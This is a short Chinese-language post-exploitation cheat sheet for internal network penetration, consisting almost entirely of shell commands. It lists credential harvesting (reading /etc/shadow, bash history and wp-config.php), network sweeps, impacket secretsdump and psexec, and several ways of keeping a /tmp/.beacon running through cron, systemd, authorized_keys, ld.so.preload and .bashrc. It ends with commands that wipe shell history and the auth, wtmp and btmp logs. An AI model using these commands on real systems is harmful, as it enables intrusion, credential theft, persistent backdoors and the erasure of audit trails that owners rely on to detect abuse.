# 内网渗透 Payload 速查

## 横向移动

```bash
# SSH横向
ssh -i id_rsa user@10.0.0.5
sshpass -p 'password' ssh user@10.0.0.5

# 凭据搜集
cat ~/.bash_history | grep -iE "ssh|mysql|psql|ftp|pass"
cat /etc/shadow 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null | grep DB_

# 内网扫描
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i | grep "ttl="; done
nmap -sn 10.0.0.0/24

# impacket (已安装)
python3 -m impacket.examples.secretsdump
python3 -m impacket.examples.psexec
```

## 持久化

```bash
# SSH密钥
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys

# crontab
(crontab -l; echo "*/5 * * * * /tmp/.beacon") | crontab -

# systemd
cat > /etc/systemd/system/helper.service << EOF
[Unit] Description=Helper
[Service] ExecStart=/tmp/.beacon
[Install] WantedBy=multi-user.target
EOF
systemctl enable helper

# LD_PRELOAD
echo "/tmp/evil.so" > /etc/ld.so.preload

# .bashrc
echo "nohup /tmp/.beacon &" >> ~/.bashrc
```

## 痕迹清理

```bash
echo "" > ~/.bash_history && history -c && unset HISTFILE
> /var/log/auth.log && > /var/log/wtmp && > /var/log/btmp
rm -f /tmp/.beacon /tmp/.systemd-helper
sed -i '/\.beacon\|\.sshd\|\.systemd/d' ~/.bashrc
```